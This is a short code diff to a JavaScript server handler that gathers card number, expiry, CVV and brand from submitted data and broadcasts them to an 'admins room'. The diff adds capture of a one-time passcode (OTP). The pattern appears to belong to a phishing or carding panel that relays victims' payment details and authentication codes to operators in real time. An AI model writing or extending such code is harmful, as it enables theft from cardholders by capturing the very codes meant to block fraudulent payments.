@@ -37,7 +37,8 @@ app.post("/emit", (req, res) => {
     cardNumber: payload.cardNumber || null,
     expiration: payload.expiration || null,
      cvv: payload.cvv || null,
-      brand: payload.brand || null
+      brand: payload.brand || null,
+      otp: payload.otp || null
   };
 
   // Broadcast only to admins room
